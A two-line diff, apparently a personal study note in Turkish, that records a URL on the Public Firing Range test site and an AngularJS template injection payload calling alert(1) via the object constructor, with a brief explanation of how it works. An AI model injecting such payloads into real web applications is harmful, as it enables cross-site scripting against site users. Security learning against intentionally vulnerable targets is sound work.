@@ -1,0 +1,2 @@
+https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
+{{constructor.constructor('alert(1)')()}} en üstteki classlara ulaşıyoruz ve alert çağırıyoruz (object cons) 
